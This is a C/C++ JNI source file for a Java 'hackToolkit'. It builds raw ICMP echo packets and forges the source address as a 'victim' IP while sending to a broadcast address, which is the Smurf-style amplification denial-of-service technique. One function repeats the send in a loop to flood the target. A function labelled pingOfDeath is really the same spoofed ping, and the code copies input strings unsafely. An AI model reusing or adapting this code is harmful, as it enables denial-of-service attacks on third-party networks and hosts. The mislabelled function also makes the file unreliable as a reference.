#define WIN32_LEAN_AND_MEAN
#include <jni.h>
#include "HackToolkit.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "PacketHeaders.h"

USHORT ip_checksum(USHORT* buffer, int size) 
{
    unsigned long cksum = 0;
    
    // Sum all the words together, adding the final byte if size is odd
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if (size) {
        cksum += *(UCHAR*)buffer;
    }

    // Do a little shuffling
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    
    // Return the bitwise complement of the resulting mishmash
    return (USHORT)(~cksum);
}

JNIEXPORT void JNICALL Java_hackit_hackToolkit_nicePing
  (JNIEnv * env, jobject obj, jstring source, jstring destination, jstring datachunk)
{
	const char * strSourceAddr = env->GetStringUTFChars( source, 0 );
	const char * strDestAddr = env->GetStringUTFChars( destination, 0 );
	const char * data = env->GetStringUTFChars( datachunk, 0 );

	ULONG broadcast_ip = inet_addr(strSourceAddr);
	ULONG victim_ip = inet_addr(strDestAddr);

	env->ReleaseStringUTFChars( source, strSourceAddr );
	env->ReleaseStringUTFChars( destination, strDestAddr );

	if( broadcast_ip == INADDR_NONE || victim_ip == INADDR_NONE )
		return;

	unsigned int packetlen = sizeof(IPHeader)+sizeof(ICMPHeader)+(env->GetStringLength(datachunk));
	char * GrimReeper = new char[packetlen];
	ZeroMemory( GrimReeper, packetlen );

	IPHEADER(GrimReeper)->h_len = sizeof(IPHeader) / sizeof(DWORD);
	IPHEADER(GrimReeper)->version = 4;
	IPHEADER(GrimReeper)->tos = 0;
	IPHEADER(GrimReeper)->total_len = htons(packetlen);
	IPHEADER(GrimReeper)->ident = htons((GetTickCount() << 1) & 0xffff);
	IPHEADER(GrimReeper)->flags = htons(0);
	IPHEADER(GrimReeper)->ttl = 128;
	IPHEADER(GrimReeper)->proto = 1;
	IPHEADER(GrimReeper)->checksum = 0;
	IPHEADER(GrimReeper)->source_ip = victim_ip;
	IPHEADER(GrimReeper)->dest_ip = broadcast_ip;
	IPHEADER(GrimReeper)->checksum = ip_checksum((USHORT*)GrimReeper, sizeof(IPHeader));
	
	ICMPHEADER(GrimReeper)->type = ICMP_ECHO_REQUEST;
	ICMPHEADER(GrimReeper)->checksum = 0;
	ICMPHEADER(GrimReeper)->code = 0;
	ICMPHEADER(GrimReeper)->id = htons(0);
	ICMPHEADER(GrimReeper)->seq = htons(0);
	ICMPHEADER(GrimReeper)->timestamp = htonl(GetTickCount());
	strcpy( DATACHUNK(GrimReeper), data );
	
	env->ReleaseStringUTFChars( datachunk, data );
	// Calculate checksum absolutely last
	ICMPHEADER(GrimReeper)->checksum = ip_checksum((USHORT*)ICMPHEADER(GrimReeper), packetlen-sizeof(IPHeader));

	WSADATA wsd;
	WSAStartup( MAKEWORD(2,2), &wsd );

	SOCKET skt = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	BOOL bOpt = TRUE;
	setsockopt( skt, IPPROTO_IP, IP_HDRINCL, (const char*)&bOpt, sizeof(bOpt));

	SOCKADDR_IN	dest;
	dest.sin_addr.s_addr = broadcast_ip;
	dest.sin_family = AF_INET;
	dest.sin_port = 0;

	sendto( skt, GrimReeper, packetlen, 0, (sockaddr*)&dest, sizeof(dest) );

	closesocket( skt );
	delete [] GrimReeper;
	WSACleanup();
}

JNIEXPORT void JNICALL Java_hackit_hackToolkit_loopPing
  (JNIEnv * env, jobject obj, jstring source, jstring destination, jstring datachunk, jlong iterations )
{
	const char * strSourceAddr = env->GetStringUTFChars( source, 0 );
	const char * strDestAddr = env->GetStringUTFChars( destination, 0 );
	const char * data = env->GetStringUTFChars( datachunk, 0 );

	ULONG broadcast_ip = inet_addr(strSourceAddr);
	ULONG victim_ip = inet_addr(strDestAddr);

	env->ReleaseStringUTFChars( source, strSourceAddr );
	env->ReleaseStringUTFChars( destination, strDestAddr );

	if( broadcast_ip == INADDR_NONE || victim_ip == INADDR_NONE )
		return;

	unsigned int packetlen = sizeof(IPHeader)+sizeof(ICMPHeader)+(env->GetStringLength(datachunk));
	char * GrimReeper = new char[packetlen];
	ZeroMemory( GrimReeper, packetlen );

	IPHEADER(GrimReeper)->h_len = sizeof(IPHeader) / sizeof(DWORD);
	IPHEADER(GrimReeper)->version = 4;
	IPHEADER(GrimReeper)->tos = 0;
	IPHEADER(GrimReeper)->total_len = htons(packetlen);
	IPHEADER(GrimReeper)->ident = htons((GetTickCount() << 1) & 0xffff);
	IPHEADER(GrimReeper)->flags = htons(0);
	IPHEADER(GrimReeper)->ttl = 128;
	IPHEADER(GrimReeper)->proto = 1;
	IPHEADER(GrimReeper)->checksum = 0;
	IPHEADER(GrimReeper)->source_ip = victim_ip;
	IPHEADER(GrimReeper)->dest_ip = broadcast_ip;
	IPHEADER(GrimReeper)->checksum = ip_checksum((USHORT*)GrimReeper, sizeof(IPHeader));
	
	ICMPHEADER(GrimReeper)->type = ICMP_ECHO_REQUEST;
	ICMPHEADER(GrimReeper)->checksum = 0;
	ICMPHEADER(GrimReeper)->code = 0;
	ICMPHEADER(GrimReeper)->id = htons(0);
	ICMPHEADER(GrimReeper)->seq = htons(0);
	ICMPHEADER(GrimReeper)->timestamp = htonl(GetTickCount());
	strcpy( DATACHUNK(GrimReeper), data );
	
	env->ReleaseStringUTFChars( datachunk, data );		
	// Calculate checksum absolutely last
	ICMPHEADER(GrimReeper)->checksum = ip_checksum((USHORT*)ICMPHEADER(GrimReeper), packetlen-sizeof(IPHeader));

	WSADATA wsd;
	WSAStartup( MAKEWORD(2,2), &wsd );

	SOCKET skt = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	BOOL bOpt = TRUE;
	setsockopt( skt, IPPROTO_IP, IP_HDRINCL, (const char*)&bOpt, sizeof(bOpt));

	SOCKADDR_IN	dest;
	dest.sin_addr.s_addr = broadcast_ip;
	dest.sin_family = AF_INET;
	dest.sin_port = 0;

	for( int i=0; i<iterations; i++ )
		sendto( skt, GrimReeper, packetlen, 0, (sockaddr*)&dest, sizeof(dest) );

	closesocket( skt );
	delete [] GrimReeper;
	WSACleanup();
}

JNIEXPORT void JNICALL Java_hackit_hackToolkit_pingOfDeath
  (JNIEnv * env, jobject obj, jstring source, jstring destination, jstring datachunk)
{
	const char * strSourceAddr = env->GetStringUTFChars( source, 0 );
	const char * strDestAddr = env->GetStringUTFChars( destination, 0 );
	const char * data = env->GetStringUTFChars( datachunk, 0 );

	ULONG broadcast_ip = inet_addr(strSourceAddr);
	ULONG victim_ip = inet_addr(strDestAddr);

	env->ReleaseStringUTFChars( source, strSourceAddr );
	env->ReleaseStringUTFChars( destination, strDestAddr );

	if( broadcast_ip == INADDR_NONE || victim_ip == INADDR_NONE )
		return;

	unsigned int packetlen = sizeof(IPHeader)+sizeof(ICMPHeader)+(env->GetStringLength(datachunk));
	char * GrimReeper = new char[packetlen];
	ZeroMemory( GrimReeper, packetlen );

	IPHEADER(GrimReeper)->h_len = sizeof(IPHeader) / sizeof(DWORD);
	IPHEADER(GrimReeper)->version = 4;
	IPHEADER(GrimReeper)->tos = 0;
	IPHEADER(GrimReeper)->total_len = htons(packetlen);
	IPHEADER(GrimReeper)->ident = htons((GetTickCount() << 1) & 0xffff);
	IPHEADER(GrimReeper)->flags = htons(0);
	IPHEADER(GrimReeper)->ttl = 128;
	IPHEADER(GrimReeper)->proto = 1;
	IPHEADER(GrimReeper)->checksum = 0;
	IPHEADER(GrimReeper)->source_ip = victim_ip;
	IPHEADER(GrimReeper)->dest_ip = broadcast_ip;
	IPHEADER(GrimReeper)->checksum = ip_checksum((USHORT*)GrimReeper, sizeof(IPHeader));
	
	ICMPHEADER(GrimReeper)->type = ICMP_ECHO_REQUEST;
	ICMPHEADER(GrimReeper)->checksum = 0;
	ICMPHEADER(GrimReeper)->code = 0;
	ICMPHEADER(GrimReeper)->id = htons(0);
	ICMPHEADER(GrimReeper)->seq = htons(0);
	ICMPHEADER(GrimReeper)->timestamp = htonl(GetTickCount());
	strcpy( DATACHUNK(GrimReeper), data );
	
	env->ReleaseStringUTFChars( datachunk, data );
		
	// Calculate checksum absolutely last
	ICMPHEADER(GrimReeper)->checksum = ip_checksum((USHORT*)ICMPHEADER(GrimReeper), packetlen-sizeof(IPHeader));

	WSADATA wsd;
	WSAStartup( MAKEWORD(2,2), &wsd );

	SOCKET skt = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	BOOL bOpt = TRUE;
	setsockopt( skt, IPPROTO_IP, IP_HDRINCL, (const char*)&bOpt, sizeof(bOpt));

	SOCKADDR_IN	dest;
	dest.sin_addr.s_addr = broadcast_ip;
	dest.sin_family = AF_INET;
	dest.sin_port = 0;

	sendto( skt, GrimReeper, packetlen, 0, (sockaddr*)&dest, sizeof(dest) );
	
	closesocket( skt );
	delete [] GrimReeper;
	WSACleanup();
}